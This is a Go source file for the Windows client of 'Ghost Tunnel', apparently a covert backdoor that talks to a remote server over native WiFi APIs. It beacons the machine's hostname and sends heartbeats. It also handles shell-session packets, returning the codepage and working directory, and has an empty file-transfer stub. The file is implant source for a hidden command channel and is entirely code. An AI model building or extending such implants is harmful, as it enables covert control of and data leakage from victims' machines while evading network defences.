package main

import (
	"container/list"
	"fmt"
	"os"
	"time"
)

var (
	apiVersion uint32 = 2
	err        error
)

// WlanAPI call operate system's native WiFi API.
type WlanAPI interface {
	SendAndReceive(t *TunnelData) *TunnelData
}

// GTClient is Ghost Tunnel Windows Client.
type GTClient struct {
	WlanAPI
	tData     chan *TunnelData
	clientID  uint8
	serverID  uint8
	connected bool
	sendList  *list.List
}

// New Windows GTClient.
func New() *GTClient {
	return &GTClient{
		WlanAPI:  InitWinAPI(),
		tData:    make(chan *TunnelData),
		sendList: list.New(),
	}
}

func (c *GTClient) sendConnReq() {
	name, _ := os.Hostname()
	for {
		if !c.connected {
			c.sendList.PushBack(&TunnelData{
				dataType: TunnelConnClientReq,
				payload:  string([]byte{0x06}) + name,
			})
		}
		time.Sleep(30 * time.Second)
	}
}

func (c *GTClient) sendHeartBeat() {
	for {
		if c.connected {
			time.Sleep(30 * time.Second)
			c.sendList.PushBack(&TunnelData{
				dataType: TunnelConnHeartBeat,
				clientID: c.clientID,
				serverID: c.serverID,
				payload:  "",
			})
		}
	}
}

func (c *GTClient) handlePacket() {
	go func() {
		for {
			if c.sendList.Len() > 0 {
				v := c.sendList.Front()
				c.tData <- c.SendAndReceive(v.Value.(*TunnelData))
				c.sendList.Remove(v)
				continue
			}
			c.tData <- c.SendAndReceive(nil)
		}
	}()

	for t := range c.tData {
		if t != nil {
			switch t.dataType & 0xF0 {
			case TunnelConn:
				c.handleConn(t)
			case TunnelShell:
				c.handleShell(t)
			case TunnelFile:
				c.handleFile(t)
			default:
				break
			}
		}
	}
}

func (c *GTClient) handleConn(t *TunnelData) {
	switch t.dataType {
	case TunnelConnServerResp:
		if !c.connected {
			c.clientID = t.clientID
			c.serverID = t.serverID
			c.connected = true
			fmt.Println("[*] Connected to Server", c.serverID)
		}
	case TunnelConnHeartBeat:
		c.connected = true
		fmt.Println("[*] Received server heartbeat")
	default:
		break
	}
}

func (c *GTClient) handleShell(t *TunnelData) {
	switch t.dataType {
	case TunnelShellInit:
		fmt.Println("[*] Shell init")
		acp := GetOEMCP()
		c.sendList.PushBack(&TunnelData{
			dataType: TunnelShellACP,
			clientID: c.clientID,
			serverID: c.serverID,
			payload:  string(acp),
		})
		dir, _ := os.Getwd()
		c.sendList.PushBack(&TunnelData{
			dataType: TunnelShellData,
			clientID: c.clientID,
			serverID: c.serverID,
			payload:  dir,
		})
	case TunnelShellData:
		fmt.Println("[*] shell data")
		fmt.Println(t.payload)
		dir, _ := os.Getwd()
		c.sendList.PushBack(&TunnelData{
			dataType: TunnelShellData,
			clientID: c.clientID,
			serverID: c.serverID,
			payload:  dir,
		})
	case TunnelShellQuit:
		fmt.Println("[*] quit shell")
		os.Exit(0)
	}
}

func (c *GTClient) handleFile(t *TunnelData) {}

func main() {
	c := New()
	if err != nil {
		fmt.Println(err)
		return
	}
	go c.sendConnReq()
	go c.sendHeartBeat()

	c.handlePacket()
}
